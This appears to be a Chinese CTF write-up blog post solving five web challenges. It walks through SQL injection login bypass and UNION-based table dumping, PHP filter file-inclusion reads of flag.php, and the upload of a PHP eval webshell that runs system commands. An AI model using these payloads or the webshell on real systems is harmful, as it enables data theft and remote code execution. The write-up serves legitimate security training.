---
title: "BUUCTF Web 题解"
description: "BUUCTF 与 NewStarCTF 的五道 Web 题：SQL 注入、文件包含、文件上传，保留当时的完整思路与截图。"
date: 2025-11-17T20:23:43+08:00
slug: "buuctf"
image: "cover.jpg"
categories: ["CTF 题解"]
tags: ["BUUCTF", "NewStarCTF", "Web 安全", "CTF"]
---

## SQL注入

### [极客大挑战 2019]LoveSQL

进入题目环境是一个登录系统

![LoveSQL 截图 1](img-01.webp)

题目表明这是SQL注入的题型，在用户名一栏填单引号会报错，说明存在注入点

使用万能密码` 1' OR 1=1#`得到用户名和密码

![LoveSQL 截图 2](img-02.webp)

先查**列数**

![LoveSQL 截图 3](img-03.webp)

1,2,3都不会报错，4的时候报错，说明列数为3

![LoveSQL 截图 4](img-04.webp)

`union select`联合查询爆出**库名**为`geek`

![LoveSQL 截图 5](img-05.webp)

继续查**表名**

1'union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23

![LoveSQL 截图 6](img-06.webp)

查出来有` 'geekuser,l0ve1ysq1'` 两个表

然后查**字段名**

1'union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23

查l0ve1ysq1这个表的字段有`id,username,password`

![LoveSQL 截图 7](img-07.webp)

再次联合查询**爆数据**

1'union select 1,2,group_concat(id,username,password) from I0ve1ysq1%23

![LoveSQL 截图 8](img-08.webp)

得到flag

flag{5ab8844b-2253-40d2-8c89-a0694c58faca}

### [NewStarCTF 2023 公开赛道]ez_sql

![ez_sql 截图 1](img-09.webp)

进入题目环境任意点击一篇文章，注入点为`id`

![ez_sql 截图 2](img-10.webp)

调出Hackbar，开始测试，先测试1，响应为 `id not exists` ，正常响应，但如果用`1'` 页面就不会显示内容，存在单引号注入，如果使用万能密码则回显正常查数据的内容

```
hh' or '1'='1
```

![ez_sql 截图 3](img-11.webp)

Or使用了大小写绕过，如果用or就会被waf

现在开始**枚举列数**

```
hh'Order By 5--+
```

![ez_sql 截图 4](img-12.webp)

当5的时候正常显示，6的时候就不会显示内容，说明列数为5，--+注释掉后面的所有内容不然会报错就不会正常显示

![ez_sql 截图 5](img-13.webp)

现在开始**查询数据库名，版本，用户信息 名为 ctf**

```
hh'Union Select database(),version(),user(),4,5--+
```

![ez_sql 截图 6](img-14.webp)

继续爆**表名 --有两个(here_is_flag,grades)**

```
hh'Union Select 1,2,3,4,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ctf'--+
```

![ez_sql 截图 7](img-15.webp)

得到 `here_is_flag,grades` 不出意外flag就是在第一个表当中

继续**爆列名**

```
hh'Union Select 1,2,3,4,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='here_is_flag'--+
```

![ez_sql 截图 8](img-16.webp)

得到列名flag，下一步就是从flag当中**提取flag的数据**

```
hh'Union Select 1,2,3,4,flag FROM here_is_flag--+
#完整一点也可以换为FROM ctf.here_is_flag
```

![ez_sql 截图 9](img-17.webp)

## 文件包含/上传

### [极客大挑战 2019]Secret File

**base64编码绕过**

进入题目环境

![Secret File 截图 1](img-18.webp)

检查一下源码

![Secret File 截图 2](img-19.webp)

有个页面可以访问

![Secret File 截图 3](img-20.webp)

`secret`可以点击，然后会跳转到这个页面

![Secret File 截图 4](img-21.webp)

将整个过程用yakit抓包

![Secret File 截图 5](img-22.webp)

![Secret File 截图 6](img-23.webp)

直接访问 `flag.php` 打不开

用file传参打开 `flag.php`

tips:打开 `base64` 编码后的页面可以输出

```
file=php://filter/convert.base64-encode/resource=flag.php
```

![Secret File 截图 7](img-24.webp)

得到了编码过后的flag

![Secret File 截图 8](img-25.webp)

### [NewStarCTF 2023 公开赛道]include 0。0

**convert.ivonc.utf-8转utf-7绕过**

进入题目环境直接给了源码

![include 0。0 截图 1](img-26.webp)

过滤了 `base` 和 `rot` 无法使用 `base64` 绕过

但是还有一种绕过方式

![include 0。0 截图 2](img-27.webp)

可以将`utf-8` 转换为 `utf-7` 绕过

```
file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
```

![include 0。0 截图 3](img-28.webp)

再将 `utf-7` 转码为 `utf-8` 就可以看见规范的flag格式

![include 0。0 截图 4](img-29.webp)

### [NewStarCTF 2023 公开赛道]Begin of Upload

进入题目环境提示需要上传文件

![Begin of Upload 截图 1](img-30.webp)

上传一个图片马，执行代码如下

```
<?php @eval($_POST['c']);?>
```

没有过滤文件名，修改为 `shell.php`

上传到了 `/upload/shell.php`

访问 `/upload/shell.php?c=system('ls /');`可以看到根目录下的文件，也可以直接用蚁剑更方便

最终 `cat/fllll4g` 得到了flag

flag{390759dd-c5c2-47c3-8a85-2b7de7052d12}
